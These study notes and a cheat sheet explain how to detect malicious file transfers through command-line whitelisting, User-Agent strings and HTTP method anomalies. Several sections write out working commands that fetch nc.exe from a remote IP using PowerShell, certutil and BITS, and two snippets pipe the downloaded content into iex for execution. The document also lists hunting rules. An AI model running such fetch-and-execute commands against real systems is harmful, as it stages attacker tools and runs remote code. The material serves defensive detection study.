# 🔎 Detection of Malicious File Transfers – Detailed Notes

---

## 🎯 Why Detection Matters

File transfers are a core part of attacker operations:

- Tool staging
    
- Payload delivery
    
- Data exfiltration
    
- Lateral movement
    

Even when attackers use **Living off the Land binaries (LOLBins)**, their activity still leaves artifacts — especially:

- Command-line arguments
    
- HTTP headers
    
- User-Agent strings
    
- Network metadata
    

---

# 🛡 1️⃣ Command-Line Detection

### ❌ Blacklisting (Weak)

- Detects known bad commands (e.g., `certutil -urlcache`)
    
- Easy to bypass:
    
    - Case obfuscation (`CertUtil`, `CeRtUtIl`)
        
    - Encoded PowerShell
        
    - Renamed binaries
        
    - Alternate parameters
        

---

### ✅ Whitelisting (Strong)

> Whitelist all allowed command lines → alert on anything unusual.

✔ More time-consuming initially  
✔ Extremely robust  
✔ Detects anomalies quickly

Example:

Instead of:

```
Block certutil.exe
```

Use:

```
Allow certutil.exe only when used by Windows Update service
Alert on any other usage
```

---

# 🌐 2️⃣ HTTP Protocol & User-Agent Detection

Most malicious file transfers use:

- HTTP
    
- HTTPS
    

Because:

- Almost always allowed through firewalls
    
- Blends with normal web traffic
    

---

## 🔎 What is a User-Agent?

Every HTTP client sends a **User-Agent string**:

```
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US)
```

It identifies:

- Browser (Chrome, Firefox)
    
- PowerShell
    
- cURL
    
- Python
    
- sqlmap
    
- Nmap
    
- Windows Update
    
- AV Updaters
    

---

## 🧠 Detection Strategy

Organizations should:

1. Build list of legitimate user agents
    
    - Browsers
        
    - Windows Update
        
    - Antivirus
        
    - Corporate software
        
2. Feed into SIEM
    
3. Filter legitimate traffic
    
4. Investigate anomalies
    

This is **far more effective than simple blocking**.

---

# 🧪 Common File Transfer User-Agent Signatures

The following were observed on:

- Windows 10 (10.0.14393)
    
- PowerShell 5
    

---

# 📌 Invoke-WebRequest

### Client

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

### Server View

```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

### 🔍 Detection Clue:

`WindowsPowerShell/5.1.x`

---

# 📌 WinHttpRequest

### Client

```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.ResponseText
```

### Server View

```
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

### 🔍 Detection Clue:

`WinHttp.WinHttpRequest.5`

---

# 📌 Msxml2.XMLHTTP

### Client

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.responseText
```

### Server View

```
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

### 🔍 Detection Clue:

Legacy IE-style UA on modern OS

---

# 📌 Certutil

### Client

```cmd
certutil -urlcache -split -f http://10.10.10.32/nc.exe
```

### Server View

```
User-Agent: Microsoft-CryptoAPI/10.0
```

### 🔍 Detection Clue:

`Microsoft-CryptoAPI`

⚠ Very common attacker technique

---

# 📌 BITS

### Client

```powershell
Import-Module bitstransfer
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t
```

### Server View

```
HEAD /nc.exe HTTP/1.1
User-Agent: Microsoft BITS/7.8
```

### 🔍 Detection Clue:

`Microsoft BITS`

---

# 🖼 Detection Architecture Overview

![Image](https://www.logsign.com/uploads/12_1_1024x504_3186269c95.png)

![Image](https://www.researchgate.net/publication/353850592/figure/fig1/AS%3A11431281089632080%401665627195645/Network-intrusion-detection-system-with-network-traffic-analysis-26.png)

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/1%2AGYiEp5wbLbgonaqynB44ZQ.png)

![Image](https://miro.medium.com/v2/resize%3Afit%3A2000/1%2AQRYdhitjgBg1ixPPnPjy5w.png)

### Typical Detection Pipeline:

1. Firewall logs HTTP requests
    
2. IDS/IPS inspects traffic
    
3. Logs forwarded to SIEM
    
4. User-Agent filtered against whitelist
    
5. Anomalies trigger alerts
    
6. SOC investigates
    

---

# 📊 Comparison Table – Suspicious User Agents

|Tool|Server User-Agent|Detection Indicator|
|---|---|---|
|Invoke-WebRequest|WindowsPowerShell/5.x|PowerShell web activity|
|WinHttpRequest|WinHttp.WinHttpRequest|COM-based download|
|Msxml2.XMLHTTP|MSIE 7.0 / Trident|Script-based download|
|Certutil|Microsoft-CryptoAPI|LOLBin abuse|
|BITS|Microsoft BITS/x|Background transfer abuse|

---

# 🛡 Best Defensive Practices

### 1️⃣ Create Command-Line Whitelist

- Allow only expected parameters
    
- Alert on anomalies
    

---

### 2️⃣ Monitor User-Agent Strings

- Build baseline
    
- Detect uncommon agents
    
- Detect rare agents from endpoints
    

---

### 3️⃣ Hunt for:

- `nc.exe` downloads
    
- `.ps1` over HTTP
    
- Executables over plaintext HTTP
    
- Certutil usage
    
- BITS jobs from user accounts
    

---

### 4️⃣ Monitor HTTP Methods

BITS often performs:

```
HEAD requests before GET
```

Certreq often sends:

```
POST requests
```

Unusual methods can indicate malicious activity.

---

# ⚠ Important (Keep As-Is)

✔ Blacklisting is easy to bypass  
✔ Whitelisting is robust but time-consuming  
✔ Hunting for anomalous user agent strings can be an excellent way to catch an attack in progress  
✔ This section just scratches the surface on detecting malicious file transfers

---

# 🧠 Key Takeaways

- Most attackers use HTTP/HTTPS
    
- User-Agent strings are powerful detection artifacts
    
- LOLBins still leave network traces
    
- Behavior-based detection > signature-based blocking
    
- Build environment baseline first

# 🛡 File Transfer Detection – Ultra Practical Cheat Sheet

---

## 🎯 Goal

Detect malicious file transfers over HTTP/HTTPS using:

- Command-line monitoring
    
- User-Agent analysis
    
- Protocol behavior
    
- LOLBin usage detection
    

---

# 1️⃣ Command-Line Detection

### ❌ Blacklisting (Weak)

- Easy to bypass
    
- Case changes
    
- Encoding
    
- Renamed binaries
    

---

### ✅ Whitelisting (Strong)

- Allow known-good command lines only
    
- Alert on deviations
    
- Best enterprise approach
    

Example:

```id="cb24xw"
Allow certutil.exe only for Windows Update
Alert on all other usage
```

---

# 2️⃣ HTTP User-Agent Detection

### 🧠 Key Concept

Every HTTP client sends a **User-Agent string**.

Detect suspicious tools by their User-Agent.

---

## 🔎 Common Malicious Transfer User-Agents

|Tool|User-Agent Seen on Server|Detection Clue|
|---|---|---|
|Invoke-WebRequest|WindowsPowerShell/5.x|PowerShell download|
|WinHttpRequest|WinHttp.WinHttpRequest|COM-based transfer|
|Msxml2.XMLHTTP|MSIE 7.0 / Trident|Script-based abuse|
|Certutil|Microsoft-CryptoAPI|LOLBin misuse|
|BITS|Microsoft BITS/x|Background job abuse|

---

# 3️⃣ PowerShell Download Indicators

### Invoke-WebRequest

```powershell
Invoke-WebRequest http://IP/file.exe -OutFile file.exe
```

Server sees:

```id="yi0p5a"
User-Agent: WindowsPowerShell/5.x
```

---

### WinHttpRequest

```powershell
new-object -com WinHttp.WinHttpRequest.5.1
```

Server sees:

```id="9tb974"
User-Agent: WinHttp.WinHttpRequest
```

---

### Msxml2

```powershell
New-Object -ComObject Msxml2.XMLHTTP
```

Server sees:

```id="xjp7ax"
User-Agent: MSIE 7.0; Trident
```

---

# 4️⃣ LOLBin Detection

### Certutil

```cmd
certutil -urlcache -split -f http://IP/file.exe
```

Server sees:

```id="4rqira"
User-Agent: Microsoft-CryptoAPI/10.0
```

---

### BITS

```powershell
Start-BitsTransfer http://IP/file.exe
```

Server sees:

```id="tlcybj"
User-Agent: Microsoft BITS/x
```

Often sends:

```id="fxxe06"
HEAD requests before GET
```

---

# 5️⃣ Suspicious HTTP Methods

Watch for unusual methods:

```id="2xrk10"
POST requests
```

Common in:

- certreq uploads
    
- Exfiltration tools
    
- Custom scripts
    

Also monitor:

- Unexpected `PUT`
    
- Unusual `HEAD`
    
- Executable downloads over HTTP
    

---

# 6️⃣ High-Value Detection Rules

Alert if:

- PowerShell downloads EXE over HTTP
    
- Certutil contacts external IP
    
- BITS runs from user context
    
- Browser-like UA from server process
    
- Rare user agent not in whitelist
    
- Large outbound transfer to unknown host
    

---

# 7️⃣ What to Baseline First

Build allow-list for:

- Chrome / Edge / Firefox
    
- Windows Update
    
- AV updates
    
- Internal tools
    
- Patch management systems
    

Everything else → investigate.

---

# 8️⃣ Detection Pipeline Overview

![Image](https://www.logsign.com/uploads/13_1_6cb8094ab7.png)

![Image](https://www.comodo.com/images/ids-in-security.png)

![Image](https://media.licdn.com/dms/image/v2/C4D12AQETnFUwdt7XXw/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1588737695532?e=2147483647&t=Co1NlyGtv5GRtuz00Dq9-z0FBn78C8JyDMbSWu0Ds04&v=beta)

![Image](https://media.licdn.com/dms/image/v2/C4D12AQGb1eW4d2Mixw/article-inline_image-shrink_1500_2232/article-inline_image-shrink_1500_2232/0/1588736349379?e=1770249600&t=NmLiNR6Fn8KJZp-rHmjYUwjbTX7QMFnPXCdq5mtMBYI&v=beta)

**Flow:**

1. Endpoint logs command line
    
2. Firewall logs HTTP request
    
3. IDS inspects headers
    
4. SIEM correlates:
    
    - User-Agent
        
    - Process
        
    - Destination
        
5. Alert on anomaly
    

---

# 9️⃣ Quick Hunting Queries (Conceptual)

Hunt for:

- `WindowsPowerShell` in proxy logs
    
- `Microsoft-CryptoAPI`
    
- `Microsoft BITS`
    
- Rare User-Agent strings
    
- HTTP downloads of `.exe`, `.ps1`, `.dll`
    
- Internal host reaching unknown IP over 80
    

---

# 🔟 Exam Key Points

✔ Blacklisting = bypassable  
✔ Whitelisting = robust  
✔ User-Agent hunting = powerful  
✔ LOLBins still leave network artifacts  
✔ Behavior-based detection > signature detection  
✔ HTTP is most common transfer channel

---
